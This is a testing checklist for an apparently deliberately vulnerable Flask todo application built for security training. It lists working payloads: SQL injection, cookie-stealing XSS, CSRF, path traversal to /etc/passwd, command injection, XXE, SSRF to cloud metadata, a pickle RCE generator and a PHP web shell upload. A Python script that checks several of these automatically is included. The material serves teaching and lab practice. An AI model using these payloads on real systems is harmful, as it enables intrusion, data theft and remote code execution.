# TESTING AND VALIDATION CHECKLIST

## Pre-Flight Checks

Before testing vulnerabilities, ensure:

- [ ] Application is running in an **isolated environment**
- [ ] You have **permission** to test this system
- [ ] Network is **isolated** or air-gapped
- [ ] You understand the **risks** and **legal implications**

---

## Installation Verification

### Step 1: Environment Check

```bash
# Check Python version
python3 --version
# Should be 3.6+ (3.6-3.11 recommended for maximum vulnerability)

# Check dependencies
pip list | grep -E "Flask|Jinja2|SQLAlchemy"

# Verify project structure
ls -la src/
ls -la src/templates/
ls -la src/static/
```

### Step 2: Application Startup

```bash
# Start application
python run.py

# Expected output:
# * Running on http://0.0.0.0:8000/ (Press CTRL+C to quit)
# * Restarting with stat
# * Debugger is active!
# * Debugger PIN: xxx-xxx-xxx
```

### Step 3: Basic Access Test

```bash
# Test application is accessible
curl http://localhost:8000/
# Should redirect to /login

# Test login page
curl http://localhost:8000/login
# Should return HTML with login form
```

---

## Vulnerability Testing Checklist

### ✅ 1. SQL Injection (CWE-89)

**Test Location:** Login page

```bash
# Test 1: Authentication bypass
Username: admin' OR '1'='1
Password: anything
Expected: Successful login

# Test 2: Error-based injection
Username: admin'
Password: test
Expected: SQL error message displayed

# Test 3: Union-based injection (search page)
Search: ' UNION SELECT username,password,null,null,null,null,null,null FROM users--
Expected: User credentials displayed
```

**Verification:**
- [ ] Can bypass authentication
- [ ] Can extract data via UNION
- [ ] SQL errors are displayed

---

### ✅ 2. Cross-Site Scripting (CWE-79)

**Test Location:** Todo creation and search

```bash
# Test 1: Stored XSS in title
Title: <script>alert('XSS')</script>
Expected: Script executes when viewing todo

# Test 2: Stored XSS in description
Description: <img src=x onerror=alert(document.cookie)>
Expected: Alert shows cookies

# Test 3: Reflected XSS in search
Search: <script>alert(1)</script>
Expected: Script executes in search results
```

**Verification:**
- [ ] XSS executes in todo title
- [ ] XSS executes in todo description
- [ ] Reflected XSS works in search
- [ ] Can steal cookies

---

### ✅ 3. CSRF (CWE-352)

**Test Location:** All forms

```html
<!-- Create test.html with this content -->
<html>
<body>
<form action="http://localhost:8000/todo/1/delete" method="POST">
<input type="submit" value="Click me">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

**Verification:**
- [ ] Can delete todo while logged in another tab
- [ ] No CSRF token required
- [ ] Form submission works from external site

---

### ✅ 4. IDOR (CWE-639)

**Test Location:** Todo viewing and modification

```bash
# Test with two user accounts
# User 1: Create todo (note the ID)
# User 2: Access todo using URL

# Access other user's todo
GET /todo/1 (as User 2)
Expected: Can view User 1's todo

# Modify other user's todo
POST /todo/1/update (as User 2)
Expected: Can modify User 1's todo

# Delete other user's todo
POST /todo/1/delete (as User 2)
Expected: Can delete User 1's todo
```

**Verification:**
- [ ] Can view other users' todos
- [ ] Can modify other users' todos
- [ ] Can delete other users' todos

---

### ✅ 5. Path Traversal (CWE-22)

**Test Location:** File download

```bash
# Test various payloads
curl http://localhost:8000/file/../../etc/passwd
curl http://localhost:8000/file/../../../etc/passwd
curl http://localhost:8000/file/../../../../etc/passwd
curl http://localhost:8000/file/../../app/src/config/config.py

# Expected: Can read files outside upload directory
```

**Verification:**
- [ ] Can read /etc/passwd
- [ ] Can read config.py
- [ ] Can traverse directory structure

---

### ✅ 6. Command Injection (CWE-78)

**Test Location:** Admin panel

```bash
# Login as admin and access /admin
# Try these commands:

Command: whoami
Expected: Shows current user

Command: id
Expected: Shows user ID and groups

Command: ls -la
Expected: Shows directory listing

Command: cat /etc/passwd
Expected: Shows passwd file

Command: ls; cat /app/src/config/config.py
Expected: Executes both commands
```

**Verification:**
- [ ] Can execute system commands
- [ ] Can chain commands with ;
- [ ] Can read sensitive files

---

### ✅ 7. XXE (CWE-611)

**Test Location:** XML import

```xml
<!-- Test payload -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<todos>
  <todo>
    <title>&xxe;</title>
    <description>XXE Test</description>
  </todo>
</todos>
```

**Verification:**
- [ ] Can define external entities
- [ ] Can read local files
- [ ] Entity reference is resolved

---

### ✅ 8. SSRF (CWE-918)

**Test Location:** URL fetch endpoint

```bash
# Test internal network access
URL: http://localhost:8080
URL: http://127.0.0.1:22
URL: http://192.168.1.1

# Test cloud metadata
URL: http://169.254.169.254/latest/meta-data/

# Test file protocol
URL: file:///etc/passwd
```

**Verification:**
- [ ] Can access localhost services
- [ ] Can scan internal network
- [ ] No URL validation present

---

### ✅ 9. Insecure Deserialization (CWE-502)

**Test Location:** Session handling

```python
# Create malicious pickle
import pickle, base64

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('touch /tmp/pwned',))

payload = base64.b64encode(pickle.dumps(RCE()))
print(payload)
# Inject this into session data
```

**Verification:**
- [ ] Pickle is used for sessions
- [ ] Can inject malicious pickle
- [ ] Code executes on deserialization

---

### ✅ 10. Hardcoded Credentials (CWE-798)

**Test Location:** Source code and config

```bash
# Check for hardcoded secrets
grep -r "password.*=" src/
grep -r "SECRET_KEY" src/
grep -r "API_KEY" src/

# View config file
cat src/config/config.py
```

**Verification:**
- [ ] Passwords in config.py
- [ ] Secret keys hardcoded
- [ ] API keys in source code
- [ ] AWS credentials present

---

### ✅ 11. Weak Cryptography (CWE-327)

**Test Location:** Password hashing

```bash
# Create user with password "test"
# Check database
sqlite3 data/vulnerable_app.db "SELECT username, password FROM users;"

# Hash should be MD5
echo -n "test" | md5sum
# Compare with database hash
```

**Verification:**
- [ ] Passwords use MD5
- [ ] Hashes match MD5 algorithm
- [ ] No salt used

---

### ✅ 12. Information Disclosure (CWE-200)

**Test Location:** Error pages and debug mode

```bash
# Trigger errors
curl http://localhost:8000/nonexistent
curl http://localhost:8000/api/todo/99999

# Check for debug mode
# Should see Werkzeug debugger with interactive console
```

**Verification:**
- [ ] Debug mode enabled
- [ ] Stack traces visible
- [ ] Database errors shown
- [ ] File paths exposed

---

### ✅ 13. Missing Authentication (CWE-306)

**Test Location:** API endpoints

```bash
# Access API without authentication
curl http://localhost:8000/api/todos?user_id=1
curl http://localhost:8000/api/todo/1
curl -X POST http://localhost:8000/api/todo/create \
     -H "Content-Type: application/json" \
     -d '{"user_id":1,"title":"Hacked","description":"No auth"}'
```

**Verification:**
- [ ] API accessible without auth
- [ ] Can read data
- [ ] Can create data
- [ ] Can modify data

---

### ✅ 14. Unrestricted File Upload (CWE-434)

**Test Location:** File upload

```bash
# Create test files
echo "test" > test.exe
echo "<?php system(\$_GET['cmd']); ?>" > shell.php

# Upload via web interface
# Try various extensions: .exe, .php, .sh, .py

# Check if files are accessible
curl http://localhost:8000/file/shell.php
```

**Verification:**
- [ ] Can upload any file type
- [ ] No extension filtering
- [ ] No content validation
- [ ] Files are executable

---

## Docker Security Testing

### Container Vulnerabilities

```bash
# Build and run container
docker-compose up --build

# Check base image
docker inspect vulnerable-todo-app | grep Image

# Check user
docker exec vulnerable-todo-app whoami
# Expected: root (VULNERABLE!)

# Check for docker socket
docker exec vulnerable-todo-app ls -la /var/run/docker.sock

# Check environment variables
docker exec vulnerable-todo-app env | grep -E "PASSWORD|SECRET|KEY"
```

**Verification:**
- [ ] Running as root
- [ ] Secrets in ENV
- [ ] Docker socket mounted
- [ ] Privileged mode enabled

---

## Automated Testing Script

```python
#!/usr/bin/env python3
"""Automated vulnerability checker"""

import requests
import sys

def test_all_vulnerabilities(base_url):
    results = []

    # Test SQL Injection
    r = requests.post(f"{base_url}/login",
                      data={"username": "admin' OR '1'='1", "password": "x"},
                      allow_redirects=False)
    results.append(("SQL Injection", r.status_code == 302))

    # Test XSS (need session)
    session = requests.Session()
    session.post(f"{base_url}/login", data={"username": "admin", "password": "admin"})
    xss = "<script>alert(1)</script>"
    session.post(f"{base_url}/todo/create", data={"title": xss, "description": "test"})
    r = session.get(f"{base_url}/todos")
    results.append(("XSS", xss in r.text))

    # Test IDOR
    r = session.get(f"{base_url}/todo/1")
    results.append(("IDOR", r.status_code == 200))

    # Test Path Traversal
    r = requests.get(f"{base_url}/file/../../etc/passwd")
    results.append(("Path Traversal", "root:" in r.text))

    # Test API without auth
    r = requests.get(f"{base_url}/api/todos?user_id=1")
    results.append(("Missing Auth", r.status_code == 200))

    print("\n" + "="*60)
    print("VULNERABILITY TEST RESULTS")
    print("="*60)
    for name, vulnerable in results:
        status = "✓ VULNERABLE" if vulnerable else "✗ SECURE"
        print(f"{name:.<40} {status}")
    print("="*60)
    print(f"\nTotal: {sum(results)}/{len(results)} vulnerabilities confirmed")

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
    test_all_vulnerabilities(url)
```

---

## Final Validation Checklist

### Application Functionality
- [ ] Application starts without errors
- [ ] Can register new users
- [ ] Can login with admin/admin
- [ ] Can create todos
- [ ] Can upload files
- [ ] Search works
- [ ] Admin panel accessible

### Vulnerabilities Present
- [ ] SQL Injection confirmed
- [ ] XSS confirmed
- [ ] CSRF confirmed
- [ ] IDOR confirmed
- [ ] Path Traversal confirmed
- [ ] Command Injection confirmed
- [ ] XXE confirmed
- [ ] SSRF confirmed
- [ ] Weak crypto confirmed
- [ ] Missing auth confirmed
- [ ] File upload confirmed

### Documentation
- [ ] README.md complete
- [ ] VULNERABILITIES.md detailed
- [ ] EXPLOITS.md has examples
- [ ] QUICKSTART.md clear
- [ ] Inline comments present

### Educational Value
- [ ] Vulnerabilities are exploitable
- [ ] Code has educational comments
- [ ] CWE numbers referenced
- [ ] Mitigations documented
- [ ] Safe to use in learning environment

---

## Troubleshooting

### Application won't start
- Check Python version (3.6-3.11 works best)
- Install dependencies: `pip install -r requirements.txt`
- Check port 8000 is available: `lsof -i :8000`

### Vulnerabilities don't work
- Ensure debug mode is on (check run.py)
- Clear browser cache
- Check you're logged in for authenticated exploits
- Verify you're testing the right URL/endpoint

### Docker issues
- Ensure Docker is running
- Clean build: `docker-compose down && docker-compose up --build`
- Check logs: `docker-compose logs`

---

## ⚠️ FINAL REMINDER

**This application is DELIBERATELY VULNERABLE for educational purposes!**

- Only use in isolated, safe environments
- Never expose to the internet
- Never use in production
- Understand legal and ethical boundaries
- Learn responsibly

**Happy Learning! 🎓🔒**
